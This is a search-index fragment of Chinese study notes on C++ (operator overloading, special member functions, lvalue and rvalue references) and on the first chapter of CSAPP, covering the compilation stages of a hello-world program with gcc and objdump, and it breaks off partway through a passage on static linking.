elements[bounds]; // fixed-size array!\n};\n\nFixedVector&lt;int, 50&gt; v1;\nFixedVector&lt;int, 10*5&gt; v2;\nFixedVector&lt;int&gt; v3; // =&gt; FixedVector&lt;int, 100&gt;\n</code></pre>"},{"location":"Accumulation/CS106L/C%2B%2B/#operator-overload","title":"Operator Overload","text":"<p>C++ \u5141\u8bb8\u4e3a\u540c\u4e00\u4f5c\u7528\u57df\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u548c\u8fd0\u7b97\u7b26\u6307\u5b9a\u591a\u4e2a\u5b9a\u4e49\uff0c\u5206\u522b\u79f0\u4e3a\u51fd\u6570\u91cd\u8f7d\u548c\u8fd0\u7b97\u7b26\u91cd\u8f7d\u3002</p> <p>\u91cd\u8f7d\u58f0\u660e\u662f\u6307\u4e00\u4e2a\u4e0e\u4e4b\u524d\u5df2\u7ecf\u5728\u8be5\u4f5c\u7528\u57df\u5185\u58f0\u660e\u8fc7\u7684\u51fd\u6570\u6216\u65b9\u6cd5\u5177\u6709\u76f8\u540c\u540d\u79f0\u7684\u58f0\u660e\uff0c\u4f46\u662f\u5b83\u4eec\u7684\u53c2\u6570\u5217\u8868\u548c\u5b9a\u4e49\uff08\u5b9e\u73b0\uff09\u4e0d\u76f8\u540c\u3002</p> <p>\u5f53\u60a8\u8c03\u7528\u4e00\u4e2a\u91cd\u8f7d\u51fd\u6570\u6216\u91cd\u8f7d\u8fd0\u7b97\u7b26\u65f6\uff0c\u7f16\u8bd1\u5668\u901a\u8fc7\u628a\u60a8\u6240\u4f7f\u7528\u7684\u53c2\u6570\u7c7b\u578b\u4e0e\u5b9a\u4e49\u4e2d\u7684\u53c2\u6570\u7c7b\u578b\u8fdb\u884c\u6bd4\u8f83\uff0c\u51b3\u5b9a\u9009\u7528\u6700\u5408\u9002\u7684\u5b9a\u4e49\u3002\u9009\u62e9\u6700\u5408\u9002\u7684\u91cd\u8f7d\u51fd\u6570\u6216\u91cd\u8f7d\u8fd0\u7b97\u7b26\u7684\u8fc7\u7a0b\uff0c\u79f0\u4e3a\u91cd\u8f7d\u51b3\u7b56\u3002</p> <p>\u4ee5\u4e0b\u8fd0\u7b97\u7b26\u4e0d\u80fd\u88ab\u91cd\u8f7d</p> <pre><code>.   .*   ::   ?:\nsizeof   typeid\nstatic_cast   dynamic_cast\nconst_cast   reinterpret_cast\n</code></pre> <p>\u91cd\u8f7d\u7684\u8fd0\u7b97\u7b26\u662f\u5e26\u6709\u7279\u6b8a\u540d\u79f0\u7684\u51fd\u6570\uff0c\u51fd\u6570\u540d\u662f\u7531\u5173\u952e\u5b57 operator \u548c\u5176\u540e\u8981\u91cd\u8f7d\u7684\u8fd0\u7b97\u7b26\u7b26\u53f7\u6784\u6210\u7684\u3002\u4e0e\u5176\u4ed6\u51fd\u6570\u4e00\u6837\uff0c\u91cd\u8f7d\u8fd0\u7b97\u7b26\u6709\u4e00\u4e2a\u8fd4\u56de\u7c7b\u578b\u548c\u4e00\u4e2a\u53c2\u6570\u5217\u8868\u3002</p> <pre><code>Integer operator-() const {\n    return Integer(-i);\n}\n...\nz = -x; // z.operator=(x.operator-());\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u5b9e\u73b0\u901a\u8baf\u5f55\u7684\u7a0b\u5e8f\uff0c\u8981\u6c42\u4e24\u4e2a User \u76f8\u52a0\u65f6\uff0c\u4e8c\u4eba\u7684\u901a\u8baf\u5f55\u90fd\u4e92\u76f8\u589e\u52a0\u5bf9\u65b9\u3002</p> <pre><code>// user.h\n#include &lt;set&gt;\n#include &lt;string&gt;\n\nclass User {\npublic:\n    // constructor\n    User() { this-&gt;name = \"\"; };\n    User(std::string name);\n\n    // getter functions\n    std::string getName() const;\n    std::set&lt;User&gt;&amp; getFriends();\n    const std::set&lt;User&gt;&amp; getFriends() const;\n\n    // setter functions\n    void setName(std::string name);\n\n    // operator overload\n    bool operator&lt; (const User &amp;b) const;\n    // \u80fd\u52a0 const \u5c31\u52a0\uff0c\u4e0d\u7136\u62a5\u9519\n    void operator+ (User&amp; b);\n\nprivate:\n    std::string name;\n    std::set&lt;User&gt; friends;\n\n};\n// =============================================\n// main.cpp\n#include &lt;iostream&gt;\n#include \"User.h\"\n\nvoid User::operator+ (User &amp;b){\n    this-&gt;friends.insert(b);\n    b.friends.insert(*this);\n}\n\nbool User::operator&lt; (const User &amp;b) const {\n    return this-&gt;name &lt; b.name;\n}\n\nvoid printFriends(const User&amp; user) {\n    std::cout &lt;&lt; user.getName() &lt;&lt; \" is friends with: \" &lt;&lt; std::endl;\n    for(auto&amp; user : user.getFriends()) {\n        std::cout &lt;&lt; \"  \" &lt;&lt; user.getName() &lt;&lt; std::endl;\n    }\n}\n\nint main() {\n    // create a bunch of users\n    User alice(\"Alice\");\n    User bob(\"Bob\");\n    User charlie(\"Charlie\");\n    User dave(\"Dave\");\n    User Inuisana;\n    Inuisana.setName(\"Inuisana\");\n\n    // make them friends\n    alice + bob;\n    alice + charlie;\n    dave + bob;\n    charlie + dave;\n    alice + Inuisana;\n\n    // print out their friends\n    printFriends(alice);\n    printFriends(bob);\n    printFriends(charlie);\n    printFriends(dave);\n\n    return 0;\n}\n\n/*Output:\nAlice is friends with: \n  Bob\n  Charlie\n  Inuisana\nBob is friends with:\n  Alice\n  Dave\nCharlie is friends with:\n  Alice\n  Dave\nDave is friends with:\n  Bob\n  Charlie\n*/\n</code></pre> <p><code>this</code> \u662f\u4e00\u4e2a\u6307\u9488\uff0c\u8fd8\u8bf7\u4e0d\u8981\u5fd8\u8bb0</p> <p>\u4e0a\u9762\u4ee3\u7801\u91cd\u8f7d\u7684 <code>+</code> \u662f\u4e00\u4e2a\u6210\u5458\u51fd\u6570\uff0c\u5982\u679c\u8981\u4f7f\u7528\u975e\u6210\u5458\u51fd\u6570\u4f5c\u4e3a\u91cd\u8f7d\u7684\u8bdd\uff0c\u8bf7\u4f7f\u7528\uff1a</p> <pre><code>User&amp; operator+(User&amp; fir, User&amp; sec) {\n    fir.friends.insert(sec);\n    sec.friends.insert(fir);\n    return fir;\n}\n/*\nIn this case, you can:\n    alice + bob;  // operator+(alice, bob)\n    alice = alice + bob;\nALl OK!\n\n\u5168\u5c40 operator \u5f80\u5f80\u8fd8\u9700\u8981\u5728\u7c7b\u4e2d\u8bbe\u7f6e\u4e3a friend\uff0c\u5982\uff1a\nfriend User&amp; operator+(User&amp; fir, User&amp; sec);\n*/\n</code></pre> \u539f\u56e0\u662f Member Function \u4e2d <code>this</code> \u662f\u4f5c\u4e3a\u4e00\u4e2a\u9690\u5f0f\u7684\u53c2\u6570\u4f20\u9012\u7684\uff0c\u56e0\u6b64\u4e5f\u76f8\u5f53\u4e8e\u4e24\u4e2a\u53c2\u6570 <pre><code>// \u4ee5\u4e0b\u51e0\u4e2a\u8fd0\u7b97\u7b26\u4f9d\u8d56 this\uff0c\u56e0\u6b64\u4e0d\u80fd\u4ee5\u975e\u6210\u5458\u51fd\u6570\u5f62\u5f0f\u91cd\u8f7d(\u5c31\u7b97\u662f friend)\noperater=, operator(), operator[], operator-&gt;, operator-&gt;*\n</code></pre> <p>\u6211\u4eec\u9700\u8981\u6ce8\u610f\u533a\u5206 <code>++</code> \u548c <code>--</code> \u7684\u51fd\u6570\u91cd\u8f7d\u5f62\u5f0f\uff1a</p> <pre><code>class Integer {\npublic:\n    ...\n    Integer&amp; operator++();   //prefix++\n    Integer operator++(int); //postfix++\n    Integer&amp; operator--();   //prefix--\n    Integer operator--(int); //postfix--\n...\n};\n\nInteger x(5);\n++x; // calls x.operator++();\nx++; // calls x.operator++(0);\n--x; // calls x.operator--();\nx--; // calls x.operator--(0);\n</code></pre> <p>\u5bf9\u4e8e postfix forms\uff0c\u5b83\u7684\u91cd\u8f7d\u51fd\u6570\u63a5\u6536\u4e00\u4e2a <code>int</code> \u7c7b\u578b\u53c2\u6570\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u5c06 <code>0</code> \u4f5c\u4e3a\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\u8fdb\u6765\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u8fd0\u7b97\u7b26\u53eb\u505a Conversion Operator\uff0c\u5b83\u5e38\u7528\u5728\u9690\u5f0f\u7684\u5f62\u5f0f\u8f6c\u6362\u4e2d\uff1a</p> <pre><code>class Rational {\npublic:\n    operator double() const {\n        return numerator / (double)denominator;\n    }\n}\n\nRational r(1,3);\ndouble d = 1.3 * r; // r =&gt; double\n</code></pre> <p>\u301019-20 Final\u3011 \u4e0b\u5217\u7a0b\u5e8f\u7684\u8f93\u51fa\u662f\u4ec0\u4e48\uff1f</p> <pre><code>#include &lt;cstring&gt;\n#include &lt;iostream&gt;\n\nusing namespace std;\n\nclass Str {\n  char m_s[10];\n  char* m_p;\npublic:\n  Str(char *s) { strcpy(m_s, s); m_p = m_s; }\n  operator char*() { return m_p; }\n  char* operator++(){ return ++m_p; } \n  char operator[](int i) { return m_s[i]; }\n};\n\nint main() {\n  Str s(\"hello\");\n  cout &lt;&lt; *s &lt;&lt; endl;   // prints \"h\", \u8fd9\u91cc\u5148\u5c06 s \u8f6c\u6362\u4e3a m_p\uff0c\u518d\u89e3\u5f15\u7528 *s \u5f97\u5230\u7b2c\u4e00\u4e2a\u503c\n  ++s;\n  cout &lt;&lt; s[0] &lt;&lt; endl; // prints 'h'\n  cout &lt;&lt; *s &lt;&lt; endl;   // prints 'e'\n  return 0;\n}\n</code></pre>"},{"location":"Accumulation/CS106L/C%2B%2B/#special-member-functions","title":"Special Member Functions","text":"<p>C++ \u4e2d\u4e00\u5171\u6709\u516d\u79cd SMF\uff0c\u8fd9\u4e9b\u6210\u5458\u51fd\u6570\u4f1a\u5728\u7f16\u8bd1\u7684\u65f6\u5019\u9ed8\u8ba4\u751f\u6210\uff0c\u6211\u4eec\u5e76\u4e0d\u9700\u8981\u624b\u52a8\u751f\u6210\u5b83\u4eec\u3002</p> <pre><code>class Widget {\npublic:\n    Widget ();                          // default constructor\n    Widget (const Wiget&amp; w);            // copy constructor\n    Wiget&amp; operator= (const Widget&amp; w); // copy assignment constructor\n\n    ~Widget ();                         // destructor\n\n    Widget (Widget&amp;&amp; rhs);              // move constructor\n    Widget&amp; operator= (Widget&amp;&amp; rhs);   // move assignment constructor\n};\n</code></pre> <p>\u9ed8\u8ba4\u6784\u9020\u51fd\u6570\u5e76\u4e0d\u4f1a\u5bf9\u6210\u5458\u53d8\u91cf\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5b83\u4eec\u4f1a\u4fdd\u6301 <code>uninitialized</code></p> <p>\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u4f20\u5165\u7684\u540c\u4e00\u7c7b\u578b\u5bf9\u8c61\u53ea\u80fd\u662f\u5f15\u7528\uff0c\u56e0\u4e3a\u5728\u6309\u503c\u4f20\u53c2\u7684\u8fc7\u7a0b\u4e2d\u672c\u8eab\u5c31\u4f1a\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570</p> <p>\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u88ab\u8c03\u7528\u7684\u573a\u5408\u5177\u4f53\u53d1\u751f\u5728\uff1a</p> <ul> <li>\u521d\u59cb\u5316: \u4f8b\u5982 <code>T t = t1;</code>\uff0c<code>T t(t1);</code> \u7b49<ul> <li>\u8fd9\u4e24\u79cd\u5206\u522b\u53eb\u505a\u62f7\u8d1d\u521d\u59cb\u5316\u548c\u76f4\u63a5\u521d\u59cb\u5316\uff0c\u533a\u522b\u53ef\u4ee5\u518d\u5f80\u4e0b\u770b</li> </ul> </li> <li>\u51fd\u6570\u53c2\u6570\u4f20\u9012: \u4f8b\u5982 <code>f(t)</code>\uff0c\u5176\u4e2d <code>void f(T t)</code></li> <li>\u51fd\u6570\u8fd4\u56de: \u4f8b\u5982\u51fd\u6570 <code>T f()</code> \u7684\u8fd4\u56de\u8bed\u53e5 <code>return T;</code></li> </ul> <p>\u9ed8\u8ba4\u7684\u62f7\u8d1d\u51fd\u6570\u662f\u76f4\u63a5\u5c06\u6307\u9488\u7684\u503c\u590d\u5236\u8fc7\u6765\uff0c\u5c5e\u4e8e shallow copy\uff0c\u9700\u8981\u6ce8\u610f\u3002</p> <p>\u53e6\u5916\uff0c\u5728\u5b9a\u4e49\u4e86\u5176\u5b83\u4efb\u4f55\u6784\u9020\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u7f16\u8bd1\u5668\u4e0d\u4f1a\u81ea\u52a8\u751f\u6210\u9ed8\u8ba4\u6784\u9020\u51fd\u6570\uff1a</p> <pre><code>struct S {\n  S(const S &amp;) { std::cout &lt;&lt; \"copy constructor\\n\"; }\n} s; // error: no matching constructor for initialization of 'struct S'\n</code></pre> <p>SMF \u7b2c\u4e8c\u6761\u548c\u7b2c\u4e09\u6761\u867d\u7136\u4f5c\u7528\u90fd\u662f\u590d\u5236\u5bf9\u8c61\uff0c\u4f46\u662f\u5b9e\u73b0\u65b9\u5f0f\u4e0d\u540c\uff1a</p> <pre><code>// call Copy Constructor\nWidget widgetOne;\nWidget widgetTwo = widgetOne;\n\n// call Copy Assignment Constructor\nWidget widgetOne;\nWidget widgetTwo;\nwidgeTwo = widgetOne;\n</code></pre> <p>\u5373\u521d\u59cb\u5316(initialization)\u7684\u65f6\u673a\u662f\u5bf9\u8c61\u521b\u5efa\u65f6\uff1b\u8d4b\u503c(assignment)\u7684\u65f6\u673a\u662f\u5bf9\u8c61\u5df2\u5b58\u5728\u540e\u3002</p> <p>\u5982\u679c\u6211\u4eec\u4e0d\u5e0c\u671b\u8fd9\u4e9b\u51fd\u6570\u8fd0\u4f5c\u7684\u8bdd\uff0c\u53ef\u4ee5\u4f7f\u7528\u5173\u952e\u5b57 <code>delete</code> \u624b\u52a8\u5c06\u5176\u5220\u53bb\uff1a</p> <pre><code>Wiget&amp; operator= (const Widget&amp; w) = delete;\n</code></pre> <p><code>copy constructor</code> \u7684\u884c\u4e3a\u903b\u8f91\u662f\u5c06\u5185\u90e8\u6210\u5458\u503c\u4e00\u4e2a\u4e00\u4e2a\u590d\u5236\u8fc7\u53bb\uff0c\u8fd0\u884c\u901f\u5ea6\u8f83\u6162\uff1b\u800c <code>move constructor</code> \u7684\u884c\u4e3a\u903b\u8f91\u662f\u5c06\u76ee\u7684\u5bf9\u8c61\u6307\u5411\u539f\u5148\u7684\u5185\u5bb9\uff0c\u8fd0\u884c\u901f\u5ea6\u8f83\u5feb\u3002</p> <p>\u5b9a\u4e49 <code>lvalue</code> \u4e3a\u65e2\u53ef\u4ee5\u5728\u7b49\u53f7\u5de6\u8fb9\uff0c\u53c8\u53ef\u4ee5\u5728\u7b49\u53f7\u53f3\u8fb9\u7684\u5bf9\u8c61\uff1b\u5b9a\u4e49 <code>rvalue</code> \u4e3a\u53ea\u80fd\u51fa\u73b0\u5728\u7b49\u53f7\u53f3\u8fb9\u7684\u5bf9\u8c61\uff0c\u5176\u4e0d\u80fd\u88ab <code>&amp;</code> \u5f15\u7528\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>&amp;&amp;</code> \u6765\u5c06\u5176\u4f5c\u4e3a\u4e34\u65f6\u5bf9\u8c61\u5f15\u7528\u5b83\uff1a</p> <pre><code>// lvalue reference:\nvoid upload (Photo&amp; pic);\n\nint main() {\n    Photo selfie = takePhoto();\n    upload(selfie);\n}\n\n// rvalue reference:\nvoid upload (Photo&amp;&amp; pic);\n\nint main() {\n    upload(takePhoto());\n}\n</code></pre> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5f53\u4f7f\u7528 <code>&amp;&amp;</code> \u5f15\u7528 <code>rvalue</code> \u65f6\uff0c\u5e76\u4e0d\u4fdd\u8bc1\u5176\u6700\u7ec8\u5904\u4e8e\u5408\u6cd5\u7684\u72b6\u6001\u3002</p> <p><code>lvalue</code> \u6307\u6709\u540d\u5b57\u3001\u53ef\u5bfb\u5740\u7684\u53d8\u91cf</p> <p>\u540c\u65f6\uff0c\u4e5f\u4e0d\u4e00\u5b9a\u6240\u6709\u5de6\u503c\u90fd\u53ef\u4ee5\u51fa\u73b0\u5728\u7b49\u53f7\u5de6\u8fb9\uff0c\u4f8b\u5982\u5bf9\u4e8e <code>const char name[] = \"Sora\";</code>\uff0c<code>name[0] = \"Sana\";</code> \u662f\u975e\u6cd5\u7684\u3002\u5c3d\u7ba1 <code>name[0]</code> \u662f\u4e2a\u5de6\u503c\uff0c\u4f46\u5b83\u7684 type \u662f <code>const char</code>\uff0c\u8fd9\u6837\u7684\u5de6\u503c\u88ab\u79f0\u4e3a non-modifiable lvalues\u3002</p> <p>\u3010Example\u3011</p> <pre><code>class A\n{\npublic:\n  A(int i) : mi(i) {}\n  A(const A&amp; rhs) : mi(rhs.mi)\n  {\n    cout &lt;&lt; \"A::A(&amp;)\" &lt;&lt; endl;\n  }\n  A&amp; operator=(const A&amp;rhs)\n  {\n    mi = rhs.mi;\n    cout &lt;&lt; \"A::operator=()\" &lt;&lt; endl;\n    return *this;\n  }\nprotected:\n  int mi;\n};\n\nclass B : public A\n{\n    ...\n}\n\nint main()\n{\n    B b(3, 4);\n\n    // \u8fd9\u91cc\u53ea\u662f\u4e00\u4e2a\u5f15\u7528\u64cd\u4f5c\uff0c\u5e76\u4e0d\u662f\u590d\u5236\uff0c\u6240\u4ee5\u4e0d\u4f1a\u89e6\u53d1 operator=\n    // \u6240\u4ee5\u65e0\u8f93\u51fa\n    A&amp; ra = b;\n\n    //\u00a0operator= \u8fd0\u7b97\u7b26\u53ea\u6709\u5728\u5bf9\u8c61\u5df2\u7ecf\u5b58\u5728\u65f6\u624d\u4f1a\u88ab\u8c03\u7528\n    // \u8fd9\u91cc\u89e6\u53d1\u7684\u662f\u62f7\u8d1d\u6784\u9020\u5668\n    A a = b;\n}\n</code></pre> <p>\u6700\u540e\u53ea\u4f1a\u8f93\u51fa <code>A::A(&amp;)</code></p> <p>\u5728\u8bed\u4e49\u4e0a\uff0c<code>C c1(7)</code> \u79f0\u4e3a\u76f4\u63a5\u521d\u59cb\u5316(direct initialization)\uff0c\u7f16\u8bd1\u5668\u76f4\u63a5\u8c03\u7528 <code>C(int)</code> \u6765\u6784\u9020 <code>c1</code>\uff1b<code>C c2 = 7</code> \u79f0\u4e3a\u62f7\u8d1d\u521d\u59cb\u5316(copy initialization)\uff0c\u7f16\u8bd1\u5668\u9700\u8981\u63a5\u53d7\u4e00\u4e2a\u975e <code>explicit</code> \u7684\u6784\u9020\u51fd\u6570\u6765\u8fdb\u884c\u9690\u5f0f\u8f6c\u6362\u3002\u4e8c\u8005\u90fd\u4f1a\u8c03\u7528 Copy Constructor\u3002</p> <pre><code>#include &lt;iostream&gt;\n\nclass C {\npublic:\n    explicit C(int) { std::cout &lt;&lt; \"i\" &lt;&lt; std::endl; }\n    C(double) { std::cout &lt;&lt; \"d\" &lt;&lt; std::endl; }\n};\n\nint main() {\n    C c1(7);   // i\n    C c2 = 7;  // d\n}\n</code></pre> <p>\u6700\u540e\uff0c\u7531\u4e8e\u5728\u5bf9\u8c61\u6784\u9020\u8fc7\u7a0b\u4e2d\u865a\u51fd\u6570\u8868\u8fd8\u672a\u4ea7\u751f\uff0c\u6240\u4ee5\u6784\u9020\u51fd\u6570\u4e0d\u80fd\u88ab\u58f0\u660e\u4e3a <code>virtual</code>\uff0c\u4f1a\u53d1\u751f\u7f16\u8bd1\u9519\u8bef\uff1b\u4f46\u662f\u6211\u4eec\u5e94\u8be5\u5c3d\u53ef\u80fd\u5728\u591a\u6001\u573a\u666f\u4e2d\u4e3a\u6790\u6784\u51fd\u6570\u58f0\u660e <code>virtual</code>\uff0c\u8fd9\u6837\u5f53\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u57fa\u7c7b\u6307\u9488\u53bb <code>delete</code> \u4e00\u4e2a\u6d3e\u751f\u5bf9\u8c61\u65f6\uff0c\u6790\u6784\u53ef\u4ee5\u6309\u7167\u6d3e\u751f\u7c7b-&gt;...-&gt;\u57fa\u7c7b\u7684\u987a\u5e8f\u6b63\u786e\u8c03\u7528\uff0c\u4fdd\u8bc1\u9500\u6bc1\u3002</p>"},{"location":"Accumulation/CSAPP/","title":"Index","text":"<p> \u7ea6 2 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u5360\u4f4d</p>"},{"location":"Accumulation/CSAPP/Chapter1/","title":"CH 1. \u8ba1\u7b97\u673a\u7cfb\u7edf\u6f2b\u6e38","text":""},{"location":"Accumulation/CSAPP/Chapter1/#chapter-1-a-tour-of-computer-system","title":"Chapter 1. A Tour of Computer System","text":"<p> \u7ea6 2182 \u4e2a\u5b57  54 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p>"},{"location":"Accumulation/CSAPP/Chapter1/#part-1","title":"Part 1. \u7a0b\u5e8f\u7ed3\u6784\u4e0e\u6267\u884c","text":"<p>\u672c\u8282\u4e3b\u8981\u8bb2\u8ff0\u4e86\u4e00\u4e2a\u7b80\u5355\u7684 Hello World \u7a0b\u5e8f\u7684\u751f\u547d\u8fdb\u7a0b</p> <pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    printf(\"Hello World\\n\");\n    return 0;\n}\n\n// Save as hello.c\n</code></pre> <p>\u4f7f\u7528\u7f16\u8bd1\u5668 <code>gcc</code> \u5bf9\u5176\u8fdb\u884c\u7f16\u8bd1\uff0c\u5e76\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6 <code>hello</code> \uff1a <code>gcc hello.c -o hello</code> </p> <p>\u5b9e\u9645\u4e0a\uff0c\u7f16\u8bd1\u8fc7\u7a0b\u53ef\u4ee5\u5206\u4e3a \u9884\u5904\u7406\u3001\u7f16\u8bd1\u3001\u6c47\u7f16\u3001\u94fe\u63a5 \u56db\u4e2a\u9636\u6bb5 </p> <p>\u7b2c\u4e00\u9636\u6bb5 : \u9884\u5904\u7406\u5668\u4f1a\u6839\u636e\u4ee5 <code>#</code> \u5f00\u5934\u7684\u4ee3\u7801\u4fee\u6539\u539f\u59cb\u7a0b\u5e8f\uff0c\u4f8b\u5982\u4e0a\u8ff0 <code>hello.c</code> \u4e2d\u5f15\u5165\u4e86\u5934\u6587\u4ef6 <code>stdio.h</code> </p> <p>\u901a\u8fc7 <code>gcc -E hello.c -o hello.i</code> \u6765\u5bf9 <code>hello.c</code> \u8fdb\u884c\u9884\u5904\u7406\uff0c\u80fd\u591f\u770b\u5230\u751f\u6210\u7684\u6587\u4ef6\u4e2d\u4ec5\u4ec5\u5bf9 <code>#include &lt;stdio.h&gt;</code> \u8fdb\u884c\u4e86\u66ff\u6362\uff0c\u800c\u5c06 <code>stdio.h</code> \u5e93\u7684\u5185\u5bb9\u5168\u90e8\u5199\u5165\uff0c\u8fd9\u662f\u4e00\u4e2a ascii \u7801\u7684\u4e2d\u95f4\u6587\u4ef6</p> <p>CPP</p> <p>C\u9884\u5904\u7406\u5668 (c preprocessor) \u4e5f\u53ef\u4ee5\u5b8c\u6210\u5bf9c\u7a0b\u5e8f\u7684\u9884\u5904\u7406 <code>cpp main.c -o main.i</code></p> <p>\u7b2c\u4e8c\u9636\u6bb5 : \u7f16\u8bd1\u5668\u5c06 <code>hello.i</code> \u6587\u4ef6\u7ffb\u8bd1\u6210 <code>hello.s</code> \u6587\u4ef6\uff0c\u5305\u62ec\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u3001\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u4e0e\u4f18\u5316\u7b49\u4e00\u7cfb\u5217\u7684\u4e2d\u95f4\u64cd\u4f5c</p> <p>\u901a\u8fc7 <code>gcc -S hello.i -o hello.s</code> (\u6216\u8005\u76f4\u63a5 <code>gcc -S hello.c -o hello.s</code> \u4e5f\u662f\u53ef\u884c\u7684) \u6765\u5bf9 <code>hello.i</code> \u8fdb\u884c\u7f16\u8bd1\uff0c\u6b64\u5904\u622a\u53d6\u90e8\u5206\u7f16\u8bd1\u751f\u6210\u7684\u6c47\u7f16\u7a0b\u5e8f\u4ee3\u7801\uff0c\u4e0d\u8be6\u7ec6\u8bb2\u89e3\uff0c\u6b64\u4e8b\u5728 \u300a\u7f16\u8bd1\u539f\u7406\u300b \u4e2d\u4ea6\u6709\u8bb0\u8f7d</p> <pre><code>        .file   \"hello.c\"\n        .text\n        .section        .rodata\n.LC0:\n        .string \"Hello World\"\n        .text\n        .globl  main\n        .type   main, @function\nmain:\n.LFB0:\n        .cfi_startproc\n        endbr64\n        pushq   %rbp\n        .cfi_def_cfa_offset 16\n        .cfi_offset 6, -16\n        movq    %rsp, %rbp\n        .cfi_def_cfa_register 6\n        leaq    .LC0(%rip), %rax\n        movq    %rax, %rdi\n</code></pre> <p>cc</p> <p>\u540c\u7406\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528C\u7f16\u8bd1\u5668 (c compiler) \u6765\u4ee3\u66ff <code>gcc</code> \uff1a <code>cc -S main.i -o main.s</code></p> <p>\u7b2c\u4e09\u9636\u6bb5 : \u6c47\u7f16\u5668\u6839\u636e\u6307\u4ee4\u96c6\u5c06\u6c47\u7f16\u7a0b\u5e8f <code>hello.s</code> \u7ffb\u8bd1\u6210\u673a\u5668\u6307\u4ee4\uff0c\u5e76\u628a\u8fd9\u4e00\u7cfb\u5217\u7684\u673a\u5668\u6307\u4ee4\u6309\u7167\u56fa\u5b9a\u7684\u89c4\u5219\u8fdb\u884c\u6253\u5305\uff0c\u5f97\u5230\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6 <code>hello.o</code> </p> <p>\u901a\u8fc7 <code>as hello.s -o hello.o</code> \u5c06\u6c47\u7f16\u4ee3\u7801\u7ffb\u8bd1\u4e3a\u76ee\u6807\u6587\u4ef6\uff0c\u4e0d\u8fc7\u6b64\u65f6\u751f\u6210\u7684\u6587\u4ef6\u662f\u4e00\u4e2a 01 \u4e8c\u8fdb\u5236\u6587\u4ef6 \uff0c\u6211\u4eec\u5e76\u4e0d\u80fd\u76f4\u89c2\u4e86\u89e3\u5176\u529f\u80fd\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u4f7f\u7528 <code>objdump -d hello.o</code> \u6307\u4ee4\u8f93\u51fa\u5176\u673a\u5668\u7801\u5f62\u5f0f\uff1a</p> <pre><code>\u276f objdump -d hello.o\n\nhello.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n\nDisassembly of section .text:\n\n0000000000000000 &lt;main&gt;:\n   0:   f3 0f 1e fa             endbr64\n   4:   55                      push   %rbp\n   5:   48 89 e5                mov    %rsp,%rbp\n   8:   48 8d 05 00 00 00 00    lea    0x0(%rip),%rax        # f &lt;main+0xf&gt;\n   f:   48 89 c7                mov    %rax,%rdi\n  12:   e8 00 00 00 00          call   17 &lt;main+0x17&gt;\n  17:   b8 00 00 00 00          mov    $0x0,%eax\n  1c:   5d                      pop    %rbp\n  1d:   c3                      ret\n</code></pre> <p>\u7b2c\u56db\u9636\u6bb5 : \u4e0a\u8ff0\u751f\u6210\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6 <code>hello.o</code> \u4ecd\u7136\u4e0d\u80fd\u6267\u884c\uff0c\u8fd8\u9700\u8981\u7ecf\u8fc7\u94fe\u63a5\u5668\u94fe\u63a5\u3002</p> <p>\u4f8b\u5982\uff0c\u6b64\u4f8b\u4e2d\u8c03\u7528\u4e86\u6807\u51c6C\u5e93\u7684 <code>printf</code> \u51fd\u6570\uff0c\u5176\u4f4d\u4e8e\u63d0\u524d\u7f16\u8bd1\u597d\u7684\u76ee\u6807\u6587\u4ef6 <code>printf.o</code> \u6587\u4ef6\u4e2d\uff0c\u94fe\u63a5\u5668(ld)\u8d1f\u8d23\u628a <code>hello.o</code> \u548c <code>printf.o</code> \u6309\u7167\u4e00\u5b9a\u89c4\u5219\u8fdb\u884c\u5408\u5e76\uff0c</p> <p>\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48 <code>hello.o</code> \u88ab\u79f0\u4e3a \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6 </p> <p>\u94fe\u63a5\u5206\u4e3a\u9759\u6001\u94fe\u63a5\u548c\u52a8\u6001\u94fe\u63a5\uff0c\u4e00\u822c\u7f16\u8bd1\u5668\u90fd\u4f1a\u9009\u62e9\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6</p> <ul> <li>\u9759\u6001\u94fe\u63a5<ul> <li>\u628a\u6240\u6709\u9700\u8981\u7684\u5e93\u5168\u90e8\u590d\u5236\u4e00\u4efd\u5230\u8c03\u7528\u5b83\u7684ELF\u6587\u4ef6\u4e2d</li> <li>\u7f3a\u70b9\u5728\u4e8e\uff0c\u5982\u679c\u4f60\u5199\u4e86100\u4efdhello.c\uff0c\u90a3\u4e48\u5c31\u590d\u5236\u4e86100\u4efdprintf\u7684\u5b9e\u73b0\u51fd\u6570\uff0c\u7a7a\u95f4\u9700\u6c42\u5927</li> <li>\u4f18\u70b9\u4e3a\uff0c\u4e0d\u7ba1\u4f60\u7535\u8111\u4e0a\u6709\u6ca1\u6709stdio.h\u7684\u73af\u5883\uff0c\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u6267\u884c\uff1b\u4ee5\u53ca\u8dd1\u7684\u901f\u5ea6\u66f4\u5feb</li> </ul> </li> 